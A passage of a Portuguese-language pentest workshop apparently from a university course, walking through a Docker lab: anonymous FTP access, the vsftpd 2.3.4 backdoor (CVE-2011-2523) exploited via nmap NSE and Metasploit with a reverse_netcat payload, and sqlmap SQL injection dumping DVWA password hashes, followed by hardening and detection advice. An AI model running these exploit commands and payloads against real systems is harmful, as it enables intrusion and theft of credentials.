Confirme tecnicamente se o acesso funcionou:

```bash
docker exec atacante_kali sh -lc 'grep -E "230 Login successful|226 Directory send OK" /tmp/evidencias/ftp-dialogo-root.txt && wc -c /tmp/evidencias/ftp-listagem-root.txt'
```

Ou, se já estivermos dentro do container:

```bash
ls -l /tmp/evidencias
sed -n '1,120p' /tmp/evidencias/ftp-dialogo-root.txt
cat /tmp/evidencias/ftp-listagem-root.txt
```

Confirme tecnicamente se o acesso funcionou:

```bash
grep -E "230 Login successful|226 Directory send OK" /tmp/evidencias/ftp-dialogo-root.txt && wc -c /tmp/evidencias/ftp-listagem-root.txt
```

**Componentes do comando:**

- `mkdir -p /tmp/evidencias`: cria um diretório local no container Kali para guardar evidências.
- `curl -sS -v`: executa o acesso FTP sem barra de progresso, exibe erros quando houver falha e mantém o diálogo detalhado.
- `--output /tmp/evidencias/ftp-listagem-root.txt`: salva a listagem retornada pelo FTP.
- `2> /tmp/evidencias/ftp-dialogo-root.txt`: salva o diálogo técnico do FTP, incluindo autenticação e códigos de resposta.

**Critério de sucesso:** o arquivo `ftp-listagem-root.txt` pode ficar vazio e, ainda assim, o teste ter funcionado. Nesse caso, a evidência principal está no `ftp-dialogo-root.txt`. As linhas `230 Login successful` e `226 Directory send OK` confirmam que o login anônimo foi aceito e que o comando `LIST` foi processado pelo servidor. Se o `wc -c` retornar `0`, isso indica apenas que o diretório FTP listado não tinha arquivos visíveis naquele momento.

Para baixar um arquivo específico, caso a listagem mostre algum conteúdo:

```bash
docker exec atacante_kali curl --fail -sS --user anonymous:anonymous -o /tmp/evidencias/NOME_DO_ARQUIVO ftp://172.18.0.10/NOME_DO_ARQUIVO
```

**Exemplo de uso:** se o FTP listar um arquivo chamado `readme.txt`, execute:

```bash
docker exec atacante_kali curl --fail -sS --user anonymous:anonymous -o /tmp/evidencias/readme.txt ftp://172.18.0.10/readme.txt
docker exec atacante_kali ls -l /tmp/evidencias/readme.txt
docker exec atacante_kali sed -n '1,80p' /tmp/evidencias/readme.txt
```

**Observação:** no ambiente validado, a listagem do FTP estava vazia, mas o login anônimo foi confirmado. Isso não invalida o achado. Em outros ambientes de laboratório, o FTP pode conter arquivos; se isso ocorrer, registre nomes, permissões e baixe apenas o necessário para comprovar acesso. Não apague nem altere evidências durante a aula.

### Passo 8.3: Interpretar impacto e evidência

Além do login anônimo, o banner `vsftpd 2.3.4` nos permite associar o alvo à **CVE-2011-2523**, uma vulnerabilidade histórica relacionada a uma versão comprometida do pacote `vsftpd 2.3.4`. A base pública dessa referência pode ser consultada em:

- [NVD - CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [CVE/MITRE - CVE-2011-2523](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523)
- [Nmap NSE - ftp-vsftpd-backdoor](https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html)

Para validar rapidamente a vulnerabilidade com evidência objetiva, use o script NSE específico do `nmap`:

```bash
docker exec atacante_kali nmap -Pn -p 21 --script ftp-vsftpd-backdoor 172.18.0.10
```

**Flags e componentes utilizados:**

- `-Pn`: trata o host como ativo, sem depender de ping.
- `-p 21`: limita o teste à porta FTP.
- `--script ftp-vsftpd-backdoor`: executa o script NSE que testa a backdoor do `vsftpd 2.3.4`.
- `172.18.0.10`: IP do `lab_metasploitable2` no laboratório validado.

**Resultado validado no laboratório:**

```text
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor:
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  BID:48539  CVE:CVE-2011-2523
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
```

**Análise:** esse resultado é uma evidência forte: o script identificou a CVE, classificou o alvo como explorável e executou o comando inofensivo `id`, retornando `uid=0(root)`. Para fins de aula, isso comprova impacto sem alterar arquivo, instalar persistência ou modificar o alvo.

Para reforçar a evidência, podemos executar uma leitura controlada de um arquivo **não sensível** em `/etc`. Neste laboratório, `/etc/os-release` não existe no alvo por se tratar de uma base antiga; por isso usamos `/etc/issue`, que identifica o sistema sem expor credenciais.

```bash
docker exec atacante_kali sh -lc 'nmap -Pn -p 21 --script ftp-vsftpd-backdoor --script-args ftp-vsftpd-backdoor.cmd="cat /etc/issue" 172.18.0.10 -oN /tmp/evidencias/vsftpd-cve-2011-2523-etc-issue.txt'
```

Verifique a evidência salva:

```bash
docker exec atacante_kali sed -n '1,160p' /tmp/evidencias/vsftpd-cve-2011-2523-etc-issue.txt
```

**Componentes adicionais do comando:**

- `--script-args ftp-vsftpd-backdoor.cmd="cat /etc/issue"`: altera o comando executado pelo script NSE no alvo vulnerável.
- `cat /etc/issue`: lê um arquivo de identificação do sistema, adequado para evidência didática por não conter segredo.
- `-oN /tmp/evidencias/vsftpd-cve-2011-2523-etc-issue.txt`: salva o resultado em formato normal do Nmap dentro do container atacante.

**Resultado validado no laboratório:**

```text
Exploit results:
  Shell command: id
  Results: uid=0(root) gid=0(root)
  Shell command: cat /etc/issue
  Results: _                  _       _ _        _     _      ____
  Warning: Never expose this VM to an untrusted network!
  Contact: msfdev[at]metasploit.com
  Login with msfadmin/msfadmin to get started
```

**Análise:** essa etapa transforma a evidência de vulnerabilidade em evidência de impacto. O retorno de `id` demonstra execução com privilégios de `root`; a leitura de `/etc/issue` demonstra que conseguimos obter conteúdo do filesystem do alvo. Para manter o workshop limpo e defensável, não usamos `/etc/shadow` nem arquivos com segredos reais. Quando for necessário provar leitura de arquivo sensível em um laboratório, prefira criar previamente um arquivo controlado, como `/etc/evidencia_lab.txt`, com conteúdo fictício preparado para a aula.

**Impacto técnico:**

- Permite autenticação sem identidade individual.
- Dificulta atribuição por usuário real.
- Pode expor arquivos indevidamente se houver conteúdo no FTP.
- Pode permitir upload indevido se o servidor estiver configurado com escrita anônima.
- Mantém protocolo em texto claro, sem proteção nativa de credenciais ou dados.
- No caso da `CVE-2011-2523`, pode permitir execução remota de comando em ambientes que contenham a versão comprometida do `vsftpd 2.3.4`.

**Evidência mínima para relatório:**

```text
Alvo: lab_metasploitable2
IP: 172.18.0.10
Serviço: FTP
Porta: 21/tcp
Versão observada: vsftpd 2.3.4
Achado: login anônimo permitido
Vulnerabilidade associada: CVE-2011-2523
Evidência 1: resposta FTP 230 Login successful
Evidência 2: script ftp-vsftpd-backdoor retornou VULNERABLE (Exploitable)
Evidência 3: comando id retornou uid=0(root) gid=0(root)
Ferramentas: nmap, nmap NSE, curl
```

**Reflexão de segurança:** um FTP anônimo pode parecer “pequeno” quando o diretório está vazio. Essa é exatamente a armadilha. O problema não é apenas o arquivo que existe hoje; é a política que permite acesso sem identidade amanhã, quando alguém colocar dado sensível no lugar errado.

### Passo 8.4: Ponte para exploração com Metasploit

O banner `vsftpd 2.3.4` é propositalmente interessante neste laboratório. Ele permite discutir a diferença entre:

- **Validação de configuração insegura:** login anônimo permitido.
- **Validação de vulnerabilidade histórica:** versão associada a backdoor em ambientes vulneráveis.
- **Exploração com framework:** uso controlado do Metasploit para validar impacto.

Para pesquisar o módulo no Metasploit:

```bash
docker exec -it atacante_kali msfconsole
```

Dentro do `msfconsole`:

```text
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 172.18.0.10
run
```

Se o Metasploit retornar erro semelhante a:

```text
[-] 172.18.0.10:21 - Msf::OptionValidateError One or more options failed to validate: LHOST.
```

isso indica que o módulo está configurado com um payload que precisa receber uma conexão reversa. Nesse caso, `LHOST` deve ser o IP do **atacante**, não o IP do alvo. No nosso laboratório, o container `atacante_kali` está em `172.18.0.21`, portanto um ajuste possível seria:

```text
set payload cmd/unix/reverse_netcat
set LHOST 172.18.0.21
set LPORT 4444
run
```

Também podemos trocar para um payload de execução simples, que não exige `LHOST`:

```text
set payload cmd/unix/generic
set CMD id
show options
run
```

**Resultado validado no laboratório:** com `cmd/unix/generic`, o erro de `LHOST` desaparece, mas o Metasploit não cria sessão nem apresenta necessariamente a saída do comando. Com `cmd/unix/reverse_bash` e `LHOST=172.18.0.21`, o handler é iniciado corretamente, mas neste ambiente validado não houve criação de sessão. Por isso, para esta aula, o `nmap` NSE continua sendo a melhor evidência prática: ele retorna `uid=0(root)` e permite registrar a leitura controlada de `/etc/issue`.

**Análise:** esta etapa faz a ponte com o workshop específico de exploração FTP já preparado na disciplina. Caso a execução crie sessão, valide apenas com comandos inofensivos como:

```text
id
hostname
whoami
```

Depois encerre a sessão:

```text
exit
```

**Observação didática:** a exploração prática completa com Metasploit deve ser conduzida com tempo próprio, pois diferenças de payload, estado do serviço e versão do framework podem alterar o comportamento. O foco desta aula é construir o caminho de descoberta, priorização e validação inicial.

---

## 9. Fase 7: Reconhecimento Web no DVWA

Depois do exemplo com `vsftpd`, vamos observar outro alvo propositalmente vulnerável: o `lab_dvwa`, baseado na imagem `vulnerables/web-dvwa`.

Aqui há uma distinção importante: o `nmap` não escaneia a imagem Docker `vulnerables/web-dvwa`; ele escaneia o **serviço em execução**, isto é, um IP e uma porta. A imagem nos dá contexto, mas a evidência operacional vem do container vivo, da porta aberta, do banner, dos headers, dos cookies e das respostas HTTP.

### Passo 9.1: Identificar IP, imagem e prontidão do DVWA

Identifique o IP interno, nome e imagem do container:

```bash
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}} {{.Name}} {{.Config.Image}}' lab_dvwa
```

**Resultado validado no laboratório:**

```text
172.18.0.20 /lab_dvwa vulnerables/web-dvwa
```

Verifique se o serviço web está realmente escutando dentro do container:

```bash
docker exec lab_dvwa sh -lc 'ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null'
```

**Resultado esperado quando o Apache está saudável:**

```text
tcp LISTEN 0 511 *:80 *:* users:(("apache2",pid=374,fd=3))
```

Se a porta `80` não aparecer como `LISTEN`, inicie o Apache no laboratório:

```bash
docker exec lab_dvwa sh -lc 'service apache2 start || apache2ctl start'
```

**Análise:** este ponto é mais importante do que parece. `docker ps` pode mostrar o container como `Up 11 days`, mas isso não prova que a aplicação está viva. Container ativo não é sinônimo de serviço disponível. Em segurança, essa diferença separa inventário superficial de validação operacional.

### Passo 9.2: Varredura básica do serviço web

Execute uma varredura focada na porta HTTP do DVWA:

```bash
docker exec atacante_kali sh -lc 'nmap -Pn -sV -sC -p 80 172.18.0.20 -oN /tmp/evidencias/dvwa-nmap-basico.txt'
```

**Flags e componentes utilizados:**

- `-Pn`: trata o host como ativo, sem depender de ICMP.
- `-sV`: identifica versão do serviço.
- `-sC`: executa scripts NSE padrão e seguros.
- `-p 80`: limita o teste à porta HTTP.
- `-oN`: salva a saída em formato normal do Nmap.

**Resultado validado no laboratório:**

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: 400 Bad Request
```

**Análise:** o banner `Apache/2.4.25 (Debian)` já indica tecnologia e versão aproximada da pilha web. O `http-title: 400 Bad Request` não deve ser lido como falha definitiva da aplicação; ele indica que o script acessou a raiz de uma forma que não retornou a página útil. Em aplicações web, precisamos validar rotas manualmente antes de concluir qualquer coisa.

### Passo 9.3: Coletar headers, cookies e evidências HTTP

Valide a rota de login diretamente:

```bash
docker exec atacante_kali sh -lc 'curl -i --connect-timeout 5 http://172.18.0.20/login.php | sed -n "1,35p"'
```

**Resultado validado no laboratório:**

```text
HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=qolpo87qpn72vjfqtgkdg27tf5; path=/
Set-Cookie: security=low
Content-Type: text/html;charset=utf-8

<title>Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
```

Salve headers e corpo HTML como evidência:

```bash
docker exec atacante_kali sh -lc 'curl -sS -D /tmp/evidencias/dvwa-login-headers.txt -o /tmp/evidencias/dvwa-login.html http://172.18.0.20/login.php'
```

Extraia os headers relevantes:

```bash
docker exec atacante_kali sh -lc 'grep -Ei "^(Server:|Set-Cookie:|X-Frame-Options:|Content-Security-Policy:|Strict-Transport-Security:|X-Content-Type-Options:)" /tmp/evidencias/dvwa-login-headers.txt || true'
```

**Resultado validado no laboratório:**

```text
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=qolpo87qpn72vjfqtgkdg27tf5; path=/
Set-Cookie: PHPSESSID=qolpo87qpn72vjfqtgkdg27tf5; path=/
Set-Cookie: security=low
```

**Análise:** aqui aparecem sinais fortes para discussão de segurança web: banner de servidor exposto, cookie de sessão sem atributos defensivos visíveis no header coletado e cookie `security=low`, específico do DVWA, indicando configuração propositalmente frágil. Também não observamos headers como `Content-Security-Policy`, `X-Frame-Options`, `Strict-Transport-Security` ou `X-Content-Type-Options` nessa resposta.

### Passo 9.4: Rodar scripts NSE de enumeração e vulnerabilidade

Execute enumeração HTTP:

```bash
docker exec atacante_kali sh -lc 'nmap -Pn -p 80 --script http-enum 172.18.0.20 -oN /tmp/evidencias/dvwa-nmap-http-enum.txt'
```

Execute scripts de vulnerabilidade do Nmap contra a porta web:

```bash
docker exec atacante_kali sh -lc 'nmap -Pn -p 80 --script vuln 172.18.0.20 -oN /tmp/evidencias/dvwa-nmap-vuln.txt'
```

**Resultado validado no laboratório:**

```text
PORT   STATE SERVICE
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
```

**Análise:** esse resultado não significa que o DVWA está seguro. Significa apenas que os scripts NSE executados, sem autenticação e sem navegar pelo fluxo real da aplicação, não conseguiram confirmar essas classes de falha. DVWA possui módulos didáticos para SQL Injection, Command Injection, XSS, CSRF, File Upload, File Inclusion e outras vulnerabilidades, mas a validação dessas falhas exige sessão autenticada, parâmetros corretos, estado da aplicação e testes específicos.

**Reflexão de segurança:** Nmap é excelente para descoberta, banner, enumeração inicial e algumas validações pontuais. Ele não substitui análise web autenticada, DAST, revisão de configuração, leitura de código ou exploração controlada por fluxo de negócio. Quando um scanner diz “não encontrei”, a pergunta profissional não é “está seguro?”, mas “o teste tinha contexto suficiente para enxergar a falha?”.

### Passo 9.5: Exploração controlada de SQL Injection com sqlmap

Usaremos como base o roteiro interno `Lab-sec-2.md`, no item **Ataque - SQL Injection no DVWA**, adaptando o alvo para o nosso container `lab_dvwa`.

O ponto importante é este: o `nmap --script vuln` não nos deu uma exploração pronta. Para explorar o DVWA corretamente, precisamos entrar no fluxo real da aplicação, autenticar, manter o cookie de sessão, confirmar `security=low` e então testar o parâmetro vulnerável `id`.

O `sqlmap` é uma ferramenta automatizada de teste de SQL Injection usada para identificar parâmetros vulneráveis, determinar o banco de dados em uso, enumerar estruturas como bancos, tabelas e colunas, e demonstrar impacto por meio de extração controlada de dados. Em um laboratório, ele é útil para acelerar a validação técnica e evidenciar o risco; em uma análise profissional, seus resultados devem ser interpretados com cuidado, registrados como evidência e sempre correlacionados com o fluxo real da aplicação.

Instale o `sqlmap` no container atacante, se ainda não existir:

```bash
docker exec atacante_kali sh -lc 'command -v sqlmap >/dev/null 2>&1 || (apt update && DEBIAN_FRONTEND=noninteractive apt install -y sqlmap)'
```

Prepare o diretório de evidências e baixe a página de login:

```bash
docker exec atacante_kali bash -lc 'mkdir -p /tmp/evidencias/dvwa-sqli && curl -sS -c /tmp/evidencias/dvwa-sqli/cookies.txt -o /tmp/evidencias/dvwa-sqli/login.html http://172.18.0.20/login.php'
```

Extraia o `user_token`, autentique no DVWA e confirme que o menu autenticado aparece:

```bash
docker exec atacante_kali bash -lc 'TOKEN=$(grep -oE "[a-f0-9]{32}" /tmp/evidencias/dvwa-sqli/login.html | head -1); echo "LOGIN_TOKEN:$TOKEN"; curl -sS -b /tmp/evidencias/dvwa-sqli/cookies.txt -c /tmp/evidencias/dvwa-sqli/cookies.txt -L -d "username=admin&password=password&Login=Login&user_token=$TOKEN" -o /tmp/evidencias/dvwa-sqli/home.html http://172.18.0.20/login.php; grep -nEi "Welcome|Logout|DVWA Security|SQL Injection|vulnerabilities/sqli" /tmp/evidencias/dvwa-sqli/home.html | sed -n "1,80p"'
```

**Credenciais padrão do laboratório:**

```text
Usuário: admin
Senha: password
```

Se o DVWA retornar `Setup DVWA` ou `First time using DVWA`, inicialize o banco de dados. Use este comando apenas no laboratório, pois ele recria as tabelas de teste:

```bash
docker exec atacante_kali bash -lc 'curl -sS -b /tmp/evidencias/dvwa-sqli/cookies.txt -o /tmp/evidencias/dvwa-sqli/setup.html http://172.18.0.20/setup.php; TOKEN=$(grep -oE "[a-f0-9]{32}" /tmp/evidencias/dvwa-sqli/setup.html | head -1); echo "SETUP_TOKEN:$TOKEN"; curl -sS -b /tmp/evidencias/dvwa-sqli/cookies.txt -c /tmp/evidencias/dvwa-sqli/cookies.txt -L --data-urlencode "create_db=Create / Reset Database" --data-urlencode "user_token=$TOKEN" -o /tmp/evidencias/dvwa-sqli/setup-result.html http://172.18.0.20/setup.php; grep -nEi "Database has been created|Setup successful|users.*created|guestbook.*created" /tmp/evidencias/dvwa-sqli/setup-result.html | sed -n "1,80p"'
```

Depois do setup, refaça o login com o comando anterior.

Valide manualmente o endpoint de SQL Injection:

```bash
docker exec atacante_kali bash -lc 'curl -sS -b /tmp/evidencias/dvwa-sqli/cookies.txt -o /tmp/evidencias/dvwa-sqli/sqli-id1.html "http://172.18.0.20/vulnerabilities/sqli/?id=1&Submit=Submit"; grep -nEi "SQL Injection|First name|Surname|User ID|Security Level" /tmp/evidencias/dvwa-sqli/sqli-id1.html | sed -n "1,80p"'
```

**Resultado validado no laboratório:**

```text
<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
User ID:
ID: 1
First name: admin
Surname: admin
Security Level: low
```

Agora execute a enumeração de bancos com `sqlmap`:

```bash
docker exec atacante_kali bash -lc 'PHPSESSID=$(awk "/PHPSESSID/ {print \$7}" /tmp/evidencias/dvwa-sqli/cookies.txt); sqlmap -u "http://172.18.0.20/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=$PHPSESSID" --batch --dbs --output-dir=/tmp/evidencias/dvwa-sqli/sqlmap-output | tee /tmp/evidencias/dvwa-sqli/sqlmap-dbs.txt'
```

**Flags e componentes utilizados:**

- `-u`: define a URL alvo com o parâmetro `id`.
- `--cookie`: envia `security=low` e o `PHPSESSID` autenticado.
- `--batch`: responde automaticamente às perguntas do `sqlmap` com valores padrão.
- `--dbs`: enumera bancos de dados disponíveis.
- `--output-dir`: salva evidências em diretório controlado.
- `tee`: mostra a saída na tela e salva em arquivo.

**Resultado validado no laboratório:**

```text
Parameter: id (GET)
Type: boolean-based blind
Type: error-based
Type: time-based blind
Type: UNION query

web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.1 (MariaDB fork)

available databases [2]:
[*] dvwa
[*] information_schema
```

Liste as tabelas do banco `dvwa`:

```bash
docker exec atacante_kali bash -lc 'PHPSESSID=$(awk "/PHPSESSID/ {print \$7}" /tmp/evidencias/dvwa-sqli/cookies.txt); sqlmap -u "http://172.18.0.20/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=$PHPSESSID" --batch -D dvwa --tables --output-dir=/tmp/evidencias/dvwa-sqli/sqlmap-output | tee /tmp/evidencias/dvwa-sqli/sqlmap-tables.txt'
```

Liste as colunas da tabela `users`:

```bash
docker exec atacante_kali bash -lc 'PHPSESSID=$(awk "/PHPSESSID/ {print \$7}" /tmp/evidencias/dvwa-sqli/cookies.txt); sqlmap -u "http://172.18.0.20/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=$PHPSESSID" --batch -D dvwa -T users --columns --output-dir=/tmp/evidencias/dvwa-sqli/sqlmap-output | tee /tmp/evidencias/dvwa-sqli/sqlmap-users-columns.txt'
```

**Resultado validado no laboratório:**

```text
Database: dvwa
Table: users
[8 columns]
+--------------+-------------+
| Column       | Type        |
+--------------+-------------+
| user         | varchar(15) |
| avatar       | varchar(70) |
| failed_login | int(3)      |
| first_name   | varchar(15) |
| last_login   | timestamp   |
| last_name    | varchar(15) |
| password     | varchar(32) |
| user_id      | int(6)      |
+--------------+-------------+
```

Faça uma extração limitada de evidência, sem tentar quebrar hashes:

```bash
docker exec atacante_kali bash -lc 'PHPSESSID=$(awk "/PHPSESSID/ {print \$7}" /tmp/evidencias/dvwa-sqli/cookies.txt); sqlmap -u "http://172.18.0.20/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=$PHPSESSID" --batch -D dvwa -T users -C user,password --dump --start=1 --stop=2 --output-dir=/tmp/evidencias/dvwa-sqli/sqlmap-output | tee /tmp/evidencias/dvwa-sqli/sqlmap-users-dump-limitado.txt'
```

**Resultado validado no laboratório:**

```text
Database: dvwa
Table: users
[2 entries]
+--------+----------------------------------+
| user   | password                         |
+--------+----------------------------------+
| 1337   | 8d3533d75ae2c3966d7e0d4fcc69216b |
| admin  | 5f4dcc3b5aa765d61d8327deb882cf99 |
+--------+----------------------------------+
```

**Análise:** agora temos uma exploração comprovada. A aplicação aceitou uma sessão autenticada, o parâmetro `id` foi identificado como vulnerável e o `sqlmap` extraiu dados do banco `dvwa`. O ponto central da aula não é “rodar ferramenta”, mas entender a cadeia: descoberta do serviço, identificação da aplicação, autenticação, manutenção de sessão, validação do parâmetro e coleta limitada de evidência.

**Observação de escopo:** neste workshop, não usamos `--os-shell`, não alteramos dados e não tentamos quebrar hashes. A demonstração para no ponto necessário para comprovar impacto: leitura não autorizada de dados por SQL Injection em aplicação vulnerável de laboratório.

**Evidência mínima para relatório:**

```text
Alvo: lab_dvwa
IP: 172.18.0.20
Imagem: vulnerables/web-dvwa
Serviço: HTTP
Porta: 80/tcp
Servidor: Apache/2.4.25 (Debian)
Aplicação: Damn Vulnerable Web Application (DVWA) v1.10 Development
Evidência 1: /login.php retornou HTTP 200
Evidência 2: cookie security=low
Evidência 3: headers defensivos ausentes na resposta observada
Evidência 4: nmap --script vuln não confirmou XSS/CSRF sem autenticação
Evidência 5: sqlmap confirmou SQL Injection no parâmetro id
Evidência 6: bancos dvwa e information_schema enumerados
Evidência 7: extração limitada da tabela dvwa.users
Ferramentas: nmap, nmap NSE, curl, sqlmap
```

---

## 10. Mitigação, Detecção e Hardening

Depois de reconhecer e validar o risco, o exercício precisa fechar o ciclo: como reduzir exposição e como detectar comportamento semelhante?

### 10.1 Reduzir exposição de portas publicadas

Listar portas publicadas:

```bash
docker ps --format 'table {{.Names}}\t{{.Ports}}'
```

Revisar portas em escuta:

```bash
ss -tulpn
```

**Mitigação:** publique apenas portas necessárias. Sempre que possível, restrinja binding para IP específico:

```bash
docker run -p 127.0.0.1:8080:80 nome-da-imagem
```

**Análise:** `127.0.0.1:8080:80` limita acesso ao loopback do host. Já `0.0.0.0:8080:80` expõe em todas as interfaces.

### 10.2 Segmentar redes Docker

Criar redes separadas para frontend e backend:

```bash
docker network create frontend-net
docker network create backend-net
```

**Mitigação:** serviços que não precisam ser acessados por usuários ou por outros containers não devem compartilhar a mesma rede de tudo. Banco de dados, painéis administrativos e serviços internos devem estar em redes mais restritas.

### 10.3 Desabilitar FTP anônimo

Em servidores `vsftpd`, revise configurações como:

```text
anonymous_enable=NO
write_enable=NO
anon_upload_enable=NO
```

**Análise:** FTP anônimo deve ser exceção muito bem justificada. Em ambientes modernos, prefira SFTP, HTTPS autenticado ou mecanismos com identidade, trilha de auditoria e criptografia.

### 10.4 Telemetria recomendada

Monitorar execução do `nmap`:

```bash
sudo auditctl -w /usr/bin/nmap -p x -k network_scan_tool
```

Monitorar conexões para serviços sensíveis:

```bash
sudo ss -antp
```

Monitorar logs do Docker:

```bash
docker events
```

**Análise:** `docker events` mostra criação, início, parada e alterações de containers em tempo real. Para produção, integre eventos e logs com uma plataforma de SIEM ou observabilidade.

### 10.5 Reduzir exposição web e endurecer respostas HTTP

Em aplicações web reais, revise headers, cookies e publicação de portas:

```text
Set-Cookie: PHPSESSID=valor; path=/; HttpOnly; Secure; SameSite=Lax
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

**Mitigação:** ambientes como DVWA, Juice Shop e Metasploitable são feitos para falhar. Eles não devem ser publicados em redes corporativas, VPNs amplas, redes Wi-Fi compartilhadas ou qualquer segmento sem controle. Em laboratório, restrinja acesso por rede host-only, firewall local, binding em IP específico e regras claras de escopo.

### 10.6 Prevenir SQL Injection

Controles mínimos para reduzir risco de SQL Injection:

```text
- Usar queries parametrizadas/prepared statements.
- Validar tipo, formato e tamanho de entradas.
- Evitar concatenação direta de parâmetros em SQL.
- Executar a aplicação com usuário de banco de menor privilégio.
- Monitorar erros SQL, padrões UNION SELECT, SLEEP(), EXTRACTVALUE() e variações boolean-based.
- Usar WAF como camada adicional, sem substituir correção no código.
```

**Mitigação:** a correção real fica no código e na modelagem de acesso ao banco. WAF, logs e detecção ajudam a reduzir janela de exposição, mas não corrigem a falha se a aplicação continuar construindo SQL com entrada do usuário.

---

## Checklist de Validação da Aula

- Confirmei o contexto de execução: host, usuário e diretório.
- Listei containers ativos com `docker ps`.
- Relacionei nomes, imagens e portas publicadas.
- Identifiquei portas expostas no host com `ss -tulpn`.
- Listei redes Docker e encontrei a rede `docker_lab_vulneravel`.
- Identifiquei subrede e gateway da rede Docker.
- Mapeei IPs dos containers ativos.
- Validei o container `atacante_kali` e suas ferramentas.
- Executei descoberta de hosts com `nmap -sn`.
- Executei varredura de serviços no Metasploitable2.
- Identifiquei `vsftpd 2.3.4` e FTP anônimo.
- Acessei o FTP anonimamente com `curl`.
- Salvei evidências do diálogo FTP e da listagem do diretório remoto.
- Associei o banner `vsftpd 2.3.4` à `CVE-2011-2523`.
- Validei a vulnerabilidade com o script `ftp-vsftpd-backdoor` do `nmap`.
- Identifiquei o container `lab_dvwa`, sua imagem e seu IP interno.
- Validei se o Apache do DVWA estava realmente escutando na porta `80`.
- Executei varredura web básica no DVWA com `nmap`.
- Coletei headers, cookies e HTML de `/login.php` com `curl`.
- Executei scripts NSE web e registrei os limites da varredura sem autenticação.
- Inicializei o banco do DVWA quando necessário.
- Autentiquei no DVWA via CLI usando `user_token` e `PHPSESSID`.
- Validei o endpoint `/vulnerabilities/sqli/`.
- Usei `sqlmap` para confirmar SQL Injection no parâmetro `id`.
- Enumerei bancos, tabelas e colunas do banco `dvwa`.
- Extraí evidência limitada da tabela `users`.
- Registrei evidência do risco e discuti impacto.
- Relacionei pelo menos três medidas de mitigação.

<p align="right">
  <sub></sub><br>
  <img src="https://hits.sh/github.com/charles-josiah/Aulas/blob/master/2026-04-Vulnerabilidades_e_Testes_de_Invasao/Workshops/02-Reconhecimento_da_rede_e_servidores.md.svg?label=leituras&color=eeeeee&labelColor=f5f5f5" alt="contador de leituras">
</p>
